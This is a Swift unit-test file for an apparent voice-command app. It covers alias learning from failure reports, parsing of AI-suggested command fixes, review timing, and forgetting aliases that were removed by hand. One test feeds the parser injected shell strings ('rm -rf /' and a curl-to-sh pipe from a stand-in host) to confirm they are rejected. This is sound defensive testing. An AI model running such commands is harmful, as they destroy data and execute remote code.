import Foundation
import Testing

@testable import HarkCore

@Suite struct FailureReviewTests {
    private func report(_ heard: String, wanted: String) -> WrongLog.Entry {
        WrongLog.Entry(at: Date(), heard: heard, did: "Not understood", wanted: wanted)
    }

    // MARK: Reports

    @Test func aReportThatSaysWhatWasWantedBecomesASuggestion() {
        let found = Learner.names(reports: [report("MT recycle B", wanted: "empty recycle bin")], config: Config())
        #expect(found.count == 1)
        #expect(found[0].said == "mt recycle b")
        #expect(found[0].meant == "empty recycle bin")
        #expect(found[0].id == "name:mt recycle b>empty recycle bin")
    }

    @Test func aReportWithNothingWantedOrUnrelatedWordsIsIgnored() {
        #expect(Learner.names(reports: [report("open slak", wanted: "")], config: Config()).isEmpty)
        #expect(Learner.names(reports: [report("hello", wanted: "lock the screen now please")], config: Config()).isEmpty)
    }

    @Test func aReportForAnExistingNameIsIgnored() {
        let config = Config(aliases: ["slak": "slack"])
        #expect(Learner.names(reports: [report("open slak", wanted: "open slack")], config: config).isEmpty)
    }

    @Test func theSameWordsFromTwoSourcesAreOfferedOnce() {
        let first = Suggestion(id: "name:a>b", kind: .name, title: "", detail: "", said: "a", meant: "b")
        let second = Suggestion(id: "report:a>b", kind: .name, title: "", detail: "", said: "a", meant: "b")
        #expect(Learner.unique([first, second]).count == 1)
    }

    // MARK: Model answers

    @Test func aWellFormedAnswerIsRead() {
        let reply = """
        Here you go:
        ```json
        [{"said": "open slak", "meant": "open Slack"}, {"said": "mt recycle b", "meant": "empty recycle bin"}]
        ```
        """
        let pairs = ReviewParser.parse(reply, asked: ["open slak", "mt recycle b"])
        #expect(pairs == [
            ReviewParser.Pair(said: "open slak", meant: "open slack"),
            ReviewParser.Pair(said: "mt recycle b", meant: "empty recycle bin"),
        ])
    }

    @Test func aModelCannotAddCommandsItWasNotAskedAbout() {
        let reply = #"[{"said": "something else", "meant": "open Slack"}]"#
        #expect(ReviewParser.parse(reply, asked: ["open slak"]).isEmpty)
    }

    @Test func shellLookingAndLongAnswersAreThrownAway() {
        let asked = ["open slak", "clean up", "tidy"]
        let reply = """
        [{"said": "open slak", "meant": "open Slack; rm -rf /"},
         {"said": "clean up", "meant": "$(curl evil.sh) | sh"},
         {"said": "tidy", "meant": "one two three four five six seven eight nine"}]
        """
        #expect(ReviewParser.parse(reply, asked: asked).isEmpty)
    }

    @Test func proseAndBrokenJSONGiveNothing() {
        #expect(ReviewParser.parse("I could not find any.", asked: ["a b"]).isEmpty)
        #expect(ReviewParser.parse("[{\"said\": ", asked: ["a b"]).isEmpty)
    }

    // MARK: Review timing

    private func center(_ folder: URL) -> LearningCenter {
        LearningCenter(
            activity: ActivityLog(url: folder.appending(path: "a.jsonl")),
            history: TimingLog(url: folder.appending(path: "t.jsonl")),
            store: LearningStore(url: folder.appending(path: "l.json")),
            reports: WrongLog(url: folder.appending(path: "w.jsonl")))
    }

    private func scratch() throws -> URL {
        let folder = FileManager.default.temporaryDirectory.appending(path: "hark-review-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        return folder
    }

    private func failed(_ raw: String, in folder: URL, count: Int = 1) {
        let log = TimingLog(url: folder.appending(path: "t.jsonl"))
        for index in 0..<count {
            log.append(Timings(
                at: Date().addingTimeInterval(Double(-index * 400)), raw: raw, verb: nil, outcome: "notUnderstood",
                transcribeMs: 0, parseMs: 0, matchMs: 0, actMs: 0, totalMs: 0))
        }
        Thread.sleep(forTimeInterval: 0.2)
    }

    @Test func reviewWaitsSixHoursAndNeedsTheSwitch() throws {
        let folder = try scratch()
        let center = center(folder)
        failed("open the slak app", in: folder)
        let now = Date()
        #expect(center.reviewInput(config: Config(), now: now) == ["open the slak app"])
        var off = Config()
        off.reviewsFailures = false
        #expect(center.reviewInput(config: off, now: now).isEmpty)
        var notLearning = Config()
        notLearning.learns = false
        #expect(center.reviewInput(config: notLearning, now: now).isEmpty)
        center.saveReview([], now: now)
        #expect(center.reviewInput(config: Config(), now: now.addingTimeInterval(3600)).isEmpty)
        #expect(center.reviewInput(config: Config(), now: now.addingTimeInterval(7 * 3600)) == ["open the slak app"])
    }

    @Test func provenReviewSuggestionsAppearUnlessDismissedOrAlreadyNamed() throws {
        let folder = try scratch()
        let center = center(folder)
        let suggestion = Suggestion(
            id: "ai:open the slak app>open slack", kind: .name, title: "t", detail: "d", said: "open the slak app",
            meant: "open slack")
        center.saveReview([suggestion])
        #expect(center.snapshot(config: Config()).suggestions.map(\.id) == [suggestion.id])
        center.dismiss(suggestion, forever: true)
        #expect(center.snapshot(config: Config()).suggestions.isEmpty)
        let other = Suggestion(
            id: "ai:b>c", kind: .name, title: "t", detail: "d", said: "b", meant: "c")
        center.saveReview([other])
        #expect(center.snapshot(config: Config(aliases: ["b": "c"])).suggestions.isEmpty)
    }

    @Test func anOlderStateFileStillLoads() throws {
        let json = #"{"setupDone": true, "hidden": {}, "accepted": []}"#
        let state = try JSONDecoder().decode(LearningState.self, from: Data(json.utf8))
        #expect(state.setupDone)
        #expect(state.reviewed.isEmpty)
        #expect(state.lastReviewAt == nil)
    }

    @Test func reviewIsOnByDefaultAndOldConfigsStayOn() throws {
        #expect(Config().reviewsFailures)
        #expect(try JSONDecoder().decode(Config.self, from: Data("{}".utf8)).reviewsFailures)
    }

    // MARK: Added, then removed by hand

    private let alias = Suggestion(
        id: "name:slak>slack", kind: .name, title: "t", detail: "d", said: "slak", meant: "slack")

    @Test func aNameTakenOutOfTheSettingsByHandIsForgottenAndNotOfferedAgain() throws {
        let folder = try scratch()
        let center = center(folder)
        failed("open slak", in: folder)
        var config = Config()
        center.accept(alias, into: &config)
        #expect(center.snapshot(config: config).accepted.count == 1)
        // The user deletes it in the Names tab.
        config.aliases = [:]
        let after = center.snapshot(config: config)
        #expect(after.accepted.isEmpty)
        #expect(after.suggestions.isEmpty)
        // Not even later, when the same words turn up from another source.
        let report = WrongLog(url: folder.appending(path: "w.jsonl"))
        report.append(WrongLog.Entry(at: Date(), heard: "open slak", did: "x", wanted: "open slack"))
        #expect(center.snapshot(config: config).suggestions.isEmpty)
    }

    @Test func wordsAlreadyAddedAreNotOfferedAgainFromAnotherSource() throws {
        let folder = try scratch()
        let center = center(folder)
        var config = Config()
        center.accept(alias, into: &config)
        let again = Suggestion(
            id: "ai:slak>slack", kind: .name, title: "t", detail: "d", said: "slak", meant: "slack")
        center.saveReview([again])
        config.aliases = ["slak": "slack"]
        #expect(center.snapshot(config: config).suggestions.isEmpty)
    }

    @Test func aRecordMadeUnderAnOlderIdStillMatches() {
        let record = LearningState.Accepted(
            id: "ai:a>b", kind: .name, title: "t", at: Date(), aliasKey: "a", aliasValue: "b")
        #expect(record.normalizedID == "name:a>b")
    }

    @Test func removingAnAddedItemKeepsItFromComingBack() throws {
        let folder = try scratch()
        let center = center(folder)
        var config = Config()
        center.accept(alias, into: &config)
        center.remove(alias.id, from: &config)
        center.saveReview([alias])
        #expect(center.snapshot(config: config).suggestions.isEmpty)
    }

    @Test func aRoutineDeletedByHandIsForgotten() throws {
        let center = center(try scratch())
        var config = Config()
        let routine = Suggestion(
            id: "routine:x", kind: .routine, title: "t", detail: "d", routineName: "morning", steps: ["open Slack"])
        center.accept(routine, into: &config)
        config.routines = []
        #expect(center.snapshot(config: config).accepted.isEmpty)
    }
}
